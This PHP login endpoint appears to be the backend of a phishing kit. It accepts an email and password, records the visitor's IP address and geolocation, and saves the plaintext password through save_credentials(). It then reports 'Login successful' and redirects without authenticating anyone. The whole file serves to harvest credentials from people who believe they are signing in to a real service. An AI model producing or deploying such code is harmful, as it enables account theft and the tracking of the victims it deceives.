<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

require_once __DIR__ . '/../includes/config.php';
require_once __DIR__ . '/../includes/functions.php';

// Handle OPTIONS (CORS preflight)
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Handle POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        $json = file_get_contents('php://input');
        $data = json_decode($json, true);

        if (json_last_error() !== JSON_ERROR_NONE) {
            throw new Exception('Invalid JSON data');
        }

        $email = sanitize_input($data['email'] ?? '');
        $password = $data['password'] ?? '';
        $login_type = sanitize_input($data['type'] ?? 'main');

        // Log visitor with geolocation
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $geoData = GEOLOCATION_ENABLED ? get_geolocation($ip) : null;
        log_visitor('login-' . $login_type);

        // Validate email
        if (!validate_email($email)) {
            echo json_encode(['success' => false, 'message' => 'Please enter a valid email address.']);
            exit;
        }

        // Validate password (minimum 8 chars)
        if (strlen($password) < 8) {
            echo json_encode(['success' => false, 'message' => 'Password must be at least 8 characters long.']);
            exit;
        }

        // Save credentials with geolocation
        $saved = save_credentials($email, $password, $login_type);

        if ($saved) {
            echo json_encode([
                'success' => true,
                'message' => 'Login successful. Redirecting...',
                'redirect' => '/success'
            ]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Failed to save credentials.']);
        }
    } catch (Exception $e) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => $e->getMessage()]);
    }
} else {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method not allowed.']);
}
?>